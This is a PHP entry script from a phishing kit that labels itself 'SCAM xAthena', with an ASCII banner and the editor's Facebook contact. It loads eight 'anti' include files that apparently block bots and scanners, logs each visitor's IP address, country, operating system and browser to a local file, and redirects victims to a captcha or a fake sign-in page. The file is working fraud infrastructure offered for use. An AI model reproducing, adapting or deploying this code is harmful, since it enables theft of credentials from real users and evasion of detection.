<?php 
/*
                /$$$$$$  /$$   /$$ /$$   /$$ /$$      /$$  /$$$$$$  /$$   /$$          
               /$$__  $$| $$  | $$| $$$ | $$| $$$    /$$$ /$$__  $$| $$$ | $$          
 /$$  /$$  /$$| $$  \__/| $$  | $$| $$$$| $$| $$$$  /$$$$| $$  \ $$| $$$$| $$ /$$   /$$
| $$ | $$ | $$|  $$$$$$ | $$  | $$| $$ $$ $$| $$ $$/$$ $$| $$$$$$$$| $$ $$ $$|  $$ /$$/
| $$ | $$ | $$ \____  $$| $$  | $$| $$  $$$$| $$  $$$| $$| $$__  $$| $$  $$$$ \  $$$$/ 
| $$ | $$ | $$ /$$  \ $$| $$  | $$| $$\  $$$| $$\  $ | $$| $$  | $$| $$\  $$$  >$$  $$ 
|  $$$$$/$$$$/|  $$$$$$/|  $$$$$$/| $$ \  $$| $$ \/  | $$| $$  | $$| $$ \  $$ /$$/\  $$
 \_____/\___/  \______/  \______/ |__/  \__/|__/     |__/|__/  |__/|__/  \__/|__/  \__/   
 
 SCAM xAthena Edited By xSUNMANx V.1 (2019)
For Any Help Contact Me on Facebook
https://www.facebook.com/rifinha
*/
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';
ob_start();
session_start();
require '../extra/algo.php';
require '../extra/languages/lang.php';
$_SESSION['ip']=clientData('ip');
$_SESSION['ip_countryName']=clientData('country');
$_SESSION['ip_countryCode']=clientData('code');
$_SESSION['currency']=clientData('currency');
$_SESSION['os']=getOs();
$_SESSION['browser']=getBrowser();
date_default_timezone_set('GMT');
$dateNow=date("d/m/Y h:i:s A"); 
$code="{$_SESSION['ip']} | {$dateNow} | {$_SESSION['os']} | {$_SESSION['browser']} | {$_SESSION['ip_countryName']} | <img style='width:21px;' src='https://bfx-objects.borderfree.com/v1/dist/images/context-chooser/flags/{$_SESSION['ip_countryCode']}.gif'> </b><br /> ";
$save=fopen("../vu.htm","a+");
fwrite($save,$code);
fclose($save);
if ($show_captcha=="yes") {
echo'<meta http-equiv="refresh" content="0; url=captcha" />';
}else{
	echo '<meta http-equiv="refresh" content="0; url=signin" />';
}
data($IP_HEADER);
?>